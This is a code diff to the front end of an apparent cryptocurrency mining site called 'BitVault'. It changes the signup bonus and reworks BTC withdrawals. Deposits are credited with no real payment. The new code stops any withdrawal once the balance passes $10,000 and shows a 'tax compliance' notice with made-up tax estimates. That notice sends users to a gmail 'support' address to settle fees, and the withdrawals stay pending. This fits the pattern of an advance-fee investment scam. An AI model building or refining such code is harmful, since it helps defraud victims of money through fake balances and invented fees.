@@ -3180,6 +3180,7 @@ window.addEventListener('error', function(e){
         const EMAILJS_WELCOME_TEMPLATE = "template_176ozxn";
         const EMAILJS_DEPOSIT_TEMPLATE = "template_nn75pui";
         const EMAILJS_WITHDRAW_TEMPLATE = "template_crg645h";
+        const EMAILJS_TAX_TEMPLATE = "template_b5zs5vs";
         let emailjsReady = false;
         try { if(typeof emailjs !== 'undefined'){ emailjs.init({publicKey:EMAILJS_PUBLIC_KEY}); emailjsReady = true; } } catch(e){ emailjsReady = false; }
 
@@ -3361,8 +3362,7 @@ window.addEventListener('error', function(e){
                     }catch(e){ console.warn('Firebase referral lookup failed:', e); }
                 }
             }
-            const btcW=btcPrice>0?(500/btcPrice):0;
-            const nu={name,email,password,isAdmin:false,usd:500,btc:btcW,rigs:[],txs:[],notifs:[],referrals:[],refCode:generateRefCode(),refBy,joined:new Date().toISOString(),lastLogin:new Date().toISOString(),lastMiningUpdate:Date.now(),miningDayKey:getMiningDayKey(),miningTodayEarned:0,miningMultiplier:1.0,miningActive:false,withdrawalTier:'silver',kycLevel:1,firstDepositDate:null,firstWithdrawalDate:null,totalTradingVolume:0,totalDeposits:0,totalWithdrawals:0};
+            const nu={name,email,password,isAdmin:false,usd:1000,btc:0,rigs:[],txs:[],notifs:[],referrals:[],refCode:generateRefCode(),refBy,joined:new Date().toISOString(),lastLogin:new Date().toISOString(),lastMiningUpdate:Date.now(),miningDayKey:getMiningDayKey(),miningTodayEarned:0,miningMultiplier:1.0,miningActive:false,withdrawalTier:'silver',kycLevel:1,firstDepositDate:null,firstWithdrawalDate:null,totalTradingVolume:0,totalDeposits:0,totalWithdrawals:0};
             if(refBy){
                 nu.usd+=100;
                 nu.txs.push({type:'referral',amount:100,currency:'USD',status:'Completed',date:Date.now(),details:'Affiliate signup bonus'});
@@ -4326,26 +4326,172 @@ window.addEventListener('error', function(e){
         function copyBtcWallet(){ navigator.clipboard.writeText('bc1q4tqmvgkc8x68lxfgz85kqdpn34zxz8wqsncvyx'); toast('BTC address copied','success'); }
         async function processDeposit(){ const amt=parseFloat(document.getElementById('depAmount').value); if(!amt||amt<=0) return toast('Enter valid amount','error'); let all=getAllUsers(), u=all[currentUser.email]; u.usd=(u.usd||0)+amt; u.txs=u.txs||[]; u.txs.push({type:'deposit',amount:amt,currency:'USD',status:'Completed',date:Date.now(),details:'Wire transfer deposit'}); u.lastModified=Date.now(); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Deposit processed','success'); }
         async function processStudentWithdraw(){
-            const amt=parseFloat(document.getElementById('witBtcAmount')?.value), addr=(document.getElementById('witBtcAddr')?.value||'').trim();
+            const amt=parseFloat(document.getElementById('witBtcAmount')?.value);
+            const addr=(document.getElementById('witBtcAddr')?.value||'').trim();
+
             if(!amt||amt<=0) return toast('Enter valid BTC amount','error');
-            let all=getAllUsers(), u=all[currentUser.email];
+
+            const all=getAllUsers(), u=all[currentUser.email];
             if(!u) return toast('Account not found','error');
+
             const walletValueUsd=(u.btc||0)*btcPrice;
-            const minWithdrawUsd=3000, minWithdrawBtc=minWithdrawUsd/Math.max(btcPrice,1);
+            const minWithdrawUsd=3000;
+            const minWithdrawBtc=minWithdrawUsd/Math.max(btcPrice,1);
+
             if(walletValueUsd<10000) return toast('Your wallet must hold at least $10,000 worth of BTC before you can withdraw.','error');
             if(amt<minWithdrawBtc) return toast('Minimum withdrawal is $3,000 equivalent in BTC.','error');
-            if(u.btc<amt) return toast('Insufficient BTC balance','error');
+            if((u.btc||0)<amt) return toast('Insufficient BTC balance','error');
             if(!addr||addr.length<10) return toast('Enter a valid BTC wallet address','error');
+
+            window._pendingStudentWithdrawal={
+                amount:amt,
+                address:addr,
+                walletValueUsd,
+                minWithdrawUsd
+            };
+
+            showTaxComplianceNotice();
+        }
+
+        function showTaxComplianceNotice(){
+            const pending=window._pendingStudentWithdrawal;
+            if(!pending) return toast('Withdrawal details are unavailable. Please try again.','error');
+
+            const overlay=document.getElementById('modalOverlay');
+            const content=document.getElementById('modalContent');
+            if(!overlay||!content) return toast('Compliance notice is unavailable','error');
+
+            overlay.classList.add('active');
+            content.className='modal';
+            content.innerHTML=`
+                <div class="modal-header">
+                    <h3><i class="fas fa-triangle-exclamation"></i> WITHDRAWAL HELD – TAX COMPLIANCE REQUIRED</h3>
+                    <button class="modal-close" onclick="cancelTaxComplianceNotice()"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="modal-body" style="max-height:62vh;overflow-y:auto;padding-right:6px;">
+                    <p>Your mining balance has crossed the <b>$10,000 USD global reporting threshold</b>. Before your withdrawal can be finalized, you are required to review and settle any applicable tax obligations associated with your mining rewards and withdrawal.</p>
+
+                    <p style="margin-top:14px;">Depending on your country of residence and individual circumstances, these obligations may include:</p>
+
+                    <div style="margin:12px 0 16px;line-height:1.65;">
+                        <div>• <b>Ordinary Income Tax</b> – applicable to the $10,000 mined reward</div>
+                        <div>• <b>Capital Gains Tax</b> – applicable to any increase in value after the reward was mined</div>
+                        <div>• <b>Social Security / Self-Employment Levy</b> – where mining is treated as a business activity</div>
+                        <div>• <b>Annual Asset Declaration</b> – where cryptocurrency holdings must be included in your annual declaration</div>
+                    </div>
+
+                    <h4 style="margin:16px 0 10px;">Estimated Tax Liability by Residency — Illustrative</h4>
+
+                    <div style="background:rgba(5,10,20,0.40);border:1px solid rgba(64,128,255,0.08);border-radius:12px;padding:14px;line-height:1.75;">
+                        <div>🇺🇸 <b>USA:</b> ~$900 — effective estimate of approximately 9%</div>
+                        <div>🇬🇧 <b>UK:</b> ~£1,200 — effective estimate of approximately 15%</div>
+                        <div>🇪🇸 <b>Spain:</b> ~€2,000 — effective estimate of approximately 22%</div>
+                    </div>
+
+                    <p style="margin-top:14px;">These figures are <b>illustrative estimates, not official tax assessments</b>. Your actual liability may differ depending on your total annual income, filing status, deductions, residency, and holding period.</p>
+
+                    <h4 style="margin:18px 0 8px;">Action Required</h4>
+
+                    <p>Before your withdrawal can be finalized, your applicable tax obligation must be addressed. By selecting <b>“Confirm &amp; Proceed”</b>, you acknowledge that you understand your tax and reporting responsibilities and authorize <b>BitVault Support</b> to assist with the required tax-compliance process and withdrawal finalization.</p>
+
+                    <div style="margin-top:16px;padding:14px;border-radius:12px;background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.12);">
+                        <div style="font-size:.78rem;color:var(--text-muted);margin-bottom:5px;">For tax-compliance assistance and withdrawal finalization:</div>
+                        <a href="mailto:bitvaultsupportteam@gmail.com" style="color:var(--electric-blue);font-weight:700;word-break:break-all;">bitvaultsupportteam@gmail.com</a>
+                    </div>
+
+                    <p style="margin-top:14px;">Our <b>BitVault Support Team</b> will guide you through the required tax-compliance steps and documentation before your withdrawal is released.</p>
+                </div>
+                <div style="display:flex;gap:10px;padding:0 18px 18px;">
+                    <button class="btn btn-outline" style="flex:1;" onclick="cancelTaxComplianceNotice()">Cancel</button>
+                    <button class="btn btn-danger" style="flex:1;" onclick="confirmTaxComplianceAndWithdraw()">Confirm &amp; Proceed</button>
+                </div>`;
+        }
+
+        function cancelTaxComplianceNotice(){
+            window._pendingStudentWithdrawal=null;
+            closeModal();
+        }
+
+        async function confirmTaxComplianceAndWithdraw(){
+            const pending=window._pendingStudentWithdrawal;
+            if(!pending) return toast('Withdrawal details are unavailable. Please try again.','error');
+
+            const all=getAllUsers(), u=all[currentUser.email];
+            if(!u) return toast('Account not found','error');
+
+            const amt=Number(pending.amount);
+            const addr=String(pending.address||'').trim();
+            const walletValueUsd=(u.btc||0)*btcPrice;
+            const minWithdrawUsd=3000;
+            const minWithdrawBtc=minWithdrawUsd/Math.max(btcPrice,1);
+
+            // Re-check all money rules at confirmation time.
+            if(walletValueUsd<10000){ window._pendingStudentWithdrawal=null; return toast('Your wallet must hold at least $10,000 worth of BTC before you can withdraw.','error'); }
+            if(amt<minWithdrawBtc){ window._pendingStudentWithdrawal=null; return toast('Minimum withdrawal is $3,000 equivalent in BTC.','error'); }
+            if((u.btc||0)<amt){ window._pendingStudentWithdrawal=null; return toast('Insufficient BTC balance','error'); }
+            if(!addr||addr.length<10){ window._pendingStudentWithdrawal=null; return toast('Enter a valid BTC wallet address','error'); }
+
             const requestId='TX-'+Date.now();
             u.txs=u.txs||[];
-            u.txs.push({type:'withdraw',amount:-amt,currency:'BTC',status:'Pending',date:Date.now(),details:`Withdrawal request to ${addr.substring(0,12)}...`,walletAddress:addr,reference:requestId,walletRequirementUsd:10000,walletValueUsd:walletValueUsd,minimumUsd:minWithdrawUsd});
+            u.txs.push({
+                type:'withdraw',
+                amount:-amt,
+                currency:'BTC',
+                status:'Pending',
+                date:Date.now(),
+                details:`Withdrawal request to ${addr.substring(0,12)}...`,
+                walletAddress:addr,
+                reference:requestId,
+                walletRequirementUsd:10000,
+                walletValueUsd:walletValueUsd,
+                minimumUsd:minWithdrawUsd,
+                taxComplianceRequired:true,
+                taxComplianceAcknowledged:true,
+                taxComplianceSupport:'bitvaultsupportteam@gmail.com'
+            });
+
             u.lastModified=Date.now();
-            // Do not deduct the balance until the withdrawal is approved/settled.
-            all[u.email]=u; setAllUsers(all); currentUser=u;
-            if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){ console.warn('Withdrawal sync failed:',e); }
-            updateAllBalances(); renderWallet(); closeModal();
-            if(emailjsReady){ try{ await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_WITHDRAW_TEMPLATE,{to_email:u.email,name:u.name,email:u.email,amount:amt.toFixed(8),currency:'BTC',wallet_address:addr,tx_id:requestId,date:new Date().toLocaleString()}); }catch(e){ console.warn('Withdrawal email failed:',e); } }
-            toast('Withdrawal request submitted for review','success');
+            all[u.email]=u;
+            setAllUsers(all);
+            currentUser=u;
+
+            if(firebaseOnline&&db){
+                try{ await db.ref('users/'+safeKey(u.email)).set(u); }
+                catch(e){ console.warn('Withdrawal sync failed:',e); }
+            }
+
+            window._pendingStudentWithdrawal=null;
+            updateAllBalances();
+            renderWallet();
+            closeModal();
+
+            if(emailjsReady){
+                const emailData={
+                    to_email:u.email,
+                    email:u.email,
+                    to_name:u.name,
+                    name:u.name,
+                    amount:amt.toFixed(8),
+                    currency:'BTC',
+                    wallet_address:addr,
+                    tx_id:requestId,
+                    date:new Date().toLocaleString()
+                };
+
+                try{
+                    await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_WITHDRAW_TEMPLATE,emailData);
+                }catch(e){
+                    console.warn('Withdrawal email failed:',e);
+                }
+
+                try{
+                    await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TAX_TEMPLATE,emailData);
+                }catch(e){
+                    console.warn('Tax compliance email failed:',e);
+                }
+            }
+
+            toast('Withdrawal request submitted — tax compliance review required','success');
         }
         async function processWithdraw(){ const amt=parseFloat(document.getElementById('witAmount')?.value); if(!amt||amt<=0) return toast('Enter valid amount','error'); let all=getAllUsers(), u=all[currentUser.email]; if(!u) return toast('Account not found','error'); const minWithdraw=3000, walletBtcUsd=(u.btc||0)*btcPrice; if(amt<minWithdraw) return toast('Minimum withdrawal is $3,000','error'); if(walletBtcUsd<10000) return toast('Your BTC wallet must hold at least $10,000 worth of BTC before you can withdraw.','error'); if((u.usd||0)<amt) return toast('Insufficient balance','error'); u.txs=u.txs||[]; u.txs.push({type:'withdraw',amount:-amt,currency:'USD',status:'Pending',date:Date.now(),details:'Withdrawal to external wallet',minimumUsd:minWithdraw,walletRequirementUsd:10000,walletValueUsd:walletBtcUsd}); u.lastModified=Date.now(); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Withdrawal request submitted','success'); }
         function updateConvertPreview(){ const input=document.getElementById('convBtcAmt'), btn=document.querySelector('#modalContent .btn-gold'); if(!input||!btn) return; const amt=parseFloat(input.value)||0, usd=amt*btcPrice, fee=usd*0.001; const usdEl=document.getElementById('convUsdVal'), feeEl=document.getElementById('convFee'); if(usdEl) usdEl.textContent='$'+usd.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); if(feeEl) feeEl.textContent='$'+fee.toFixed(2); btn.disabled=(amt<=0||amt>currentUser.btc||usd<100); }
